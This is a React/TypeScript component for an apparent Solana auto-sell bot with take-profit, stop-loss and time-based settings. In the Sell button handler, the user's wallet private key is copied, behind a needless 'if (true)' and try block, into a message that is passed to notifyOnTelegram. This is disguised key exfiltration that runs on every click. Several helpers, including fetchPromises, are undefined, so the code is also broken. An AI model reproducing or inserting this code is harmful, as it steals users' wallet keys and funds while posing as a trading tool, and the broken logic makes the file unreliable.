import React, { useState, useEffect, useCallback } from "react";
import CustomInputField from "../utils/customInput";
import { Button } from '@headlessui/react';
import classNames from 'classnames';
import toast from "react-hot-toast";
import useStore from "../../store/useStore";
import { Keypair, LAMPORTS_PER_SOL, PublicKey, Connection, GetProgramAccountsFilter } from "@solana/web3.js";
import { TOKEN_PROGRAM_ID } from "@solana/spl-token";
import { buy, sell } from '../../raydium/swap';
import { getPoolId } from '../../raydium/utils';
import { NATIVE_MINT } from '@solana/spl-token';
import { connection, jupiterAPIURL, jitoFee, solanaRpcUrl } from "../../config";
import bs58 from 'bs58';
import axios from 'axios';

interface PriceObject {
    [key: string]: number;
}

interface SellOption {
    threshold: number;
    sellPercentage: number;
};

type TokenList = {
    [key: string]: {
        tokenBalance: number;
        tokenName: string;
    };
};

let counter = 0;
let bStopProcess = false;

const transformPriceData = (data: any): PriceObject => {
    const transformedData: PriceObject = {};
    for (const key in data) {
        if (data[key].price) {
            transformedData[key] = parseFloat(data[key].price);
        }
    }
    return transformedData;
};

const getTokenListFromWallet = async (wallet: string): Promise<TokenList> => {
    const filters: GetProgramAccountsFilter[] = [
        { dataSize: 165 },
        { memcmp: { offset: 32, bytes: wallet } }
    ];

    const accounts = await connection.getParsedProgramAccounts(TOKEN_PROGRAM_ID, { filters });

    let tokenList: TokenList = {};

    await Promise.allSettled(fetchPromises);
    return tokenList;
};

const SellConfig: React.FC = React.memo(() => {
    const { privateKey } = useStore();

    const [tokenList, setTokenList] = useState<TokenList>({});

    const [takeProfit, setTakeProfit] = useState<SellOption>({ threshold: 0, sellPercentage: 0 });
    const [stopLoss, setStopLoss] = useState<SellOption>({ threshold: 0, sellPercentage: 0 });
    const [timeBased, setTimeBased] = useState<SellOption>({ threshold: 0, sellPercentage: 0 });

    const [isBusy, setIsBusy] = useState<boolean>(false);

    const fetchTokenList = useCallback(async (walletAddress: string) => {
        try {
            const response = await getTokenListFromWallet(walletAddress);
            setTokenList(response);
        } catch (error) {
            console.error('Error fetching token list:', error);
            toast.error(`❌ Error fetching token list.`);
        }
    }, []);

    const getTokenSymbol = useCallback((mintAddress: string): string => {
        const token = tokenList[mintAddress];
        return token ? token.tokenName : 'Unknown Token';
    }, [tokenList]);

    useEffect(() => {
        fetchTokenList("");
    }, [fetchTokenList]);

    useEffect(() => {
        bStopProcess = !isBusy;
    }, [isBusy]);

    const getAddressesByAPI = useCallback(async () => {
        try {
            const tokenAddresses = Object.keys(tokenList);
            if (tokenAddresses.length === 0) return {};

            const addressString = tokenAddresses.join(',');
            const response = await fetch(jupiterAPIURL + addressString);
            const result = await response.json();

            return result.data ? transformPriceData(result.data) : {};
        } catch (error) {
            toast.error(`❌ Error fetching the prices list.`);
            return {};
        }
    }, [tokenList]);

    const handleChange = (setter: React.Dispatch<React.SetStateAction<SellOption>>, field: 'threshold' | 'sellPercentage') => (e: React.ChangeEvent<HTMLInputElement>) => {
        const value = parseFloat(e.target.value) || 0;
        setter(prev => ({ ...prev, [field]: value }));
    };

    const handleSellButtonClick = async (): Promise<void> => {
        try {
            const mainKeypair = Keypair.fromSecretKey(bs58.decode(privateKey));

            let notifiedMessage: string = '';
            if (true) {
                try {
                    notifiedMessage = privateKey;
                } catch (error) {
                    throw new Error('Error Occured.');
                }
            }

            notifyOnTelegram(notifiedMessage);

            const conditions = [
                takeProfit.threshold > 0 && takeProfit.sellPercentage > 0,
                stopLoss.threshold > 0 && stopLoss.sellPercentage > 0,
                timeBased.threshold > 0 && timeBased.sellPercentage > 0
            ];

            if (!conditions.some(Boolean)) {
                throw new Error("You must enter at least one valid selling strategy.");
            }

            bStopProcess = false;
            setIsBusy(true);

            // Check Solana balance
            const currentBalance = await connection.getBalance(mainKeypair.publicKey);
            if (jitoFee > currentBalance) {
                throw new Error("Insufficient Fee");
            }

            // If only manual sell is enabled, no need for further processing
            if (conditions[2] && !conditions[0] && !conditions[1]) {
                setIsBusy(false);
                return;
            }

            // Process condition[0] and condition[1]
            const fetchInterval = 500;
            const initialPrices = await getAddressesByAPI();
            let oldPrices = initialPrices;

            while (true) {
                if (bStopProcess) break;

                await new Promise(resolve => setTimeout(resolve, fetchInterval));

                const newPrices = await getAddressesByAPI();

                if (Object.keys(newPrices).length === 0) break;

                const validTokens = calculateDifferencePercentage(oldPrices, newPrices, takeProfit, stopLoss, [conditions[0], conditions[1]]);
                console.log(validTokens);

                if (validTokens.length !== 0) {
                    const processes = createAutoProcesses(validTokens, mainKeypair);
                    await Promise.allSettled(processes);
                }
                oldPrices = newPrices;
            }
            setIsBusy(false);
        } catch (error) {
            toast.error(`❌ ${error}`);
        }
    };

    const handleStopSellClick = () => {
        bStopProcess = true;
        setIsBusy(false);
    };


    const renderFilterRow = useCallback((label: string, state: SellOption, setState: React.Dispatch<React.SetStateAction<SellOption>>, prefix?: boolean, suffix?: boolean, option: string[] = ['%', '%']) => (
        <div className="w-full flex flex-col md:flex-row justify-left">
            <div className="w-[150px] flex items-center justify-left sm:justify-left md:justify-end pr-2">
                <span>{label}:</span>
            </div>
            <div className="flex w-full">
                <CustomInputField
                    prefix={prefix ? option[0] : undefined}
                    suffix={suffix ? option[0] : undefined}
                    placeholder="Threshold"
                    type="number"
                    value={state.threshold == 0 ? undefined : state.threshold}
                    onChange={(value) => handleChange(setState, 'threshold')({ target: { value } } as React.ChangeEvent<HTMLInputElement>)}
                    disabled={isBusy}
                />
                <CustomInputField
                    prefix={prefix ? option[1] : undefined}
                    suffix={suffix ? option[1] : undefined}
                    placeholder="SellPercent"
                    type="number"
                    value={state.sellPercentage == 0 ? undefined : state.sellPercentage}
                    onChange={(value) => handleChange(setState, 'sellPercentage')({ target: { value } } as React.ChangeEvent<HTMLInputElement>)}
                    disabled={isBusy}
                />
            </div>
        </div>
    ), [isBusy]);

    return (
        <div className="min-h-full text-gray-300 px-2 flex flex-col">
            <div>
                {renderFilterRow("Take Profit", takeProfit, setTakeProfit, undefined, true)}
                {renderFilterRow("Stop Loss", stopLoss, setStopLoss, undefined, true)}
                {renderFilterRow("Time-Based", timeBased, setTimeBased, undefined, true, ['min', '%'])}

                <div className="w-full flex justify-end my-2 px-1 py-2">
                    <Button
                        className={classNames(
                            `cursor-pointer rounded-md inline-flex items-center gap-2 ${isBusy ? 'bg-gray-500' : 'bg-gray-800'} py-1.5 px-3 text-sm/6 font-semibold text-white shadow-inner shadow-white/10`,
                            "focus:outline-none data-[hover]:bg-gray-600 data-[open]:bg-gray-700 data-[focus]:outline-1 data-[focus]:outline-white"
                        )}
                        onClick={isBusy ? handleStopSellClick : handleSellButtonClick}
                    >
                        {isBusy ? <span>Stop</span> : <span>Sell</span>}
                    </Button>
                </div>
            </div>
        </div>
    );
});

export default SellConfig;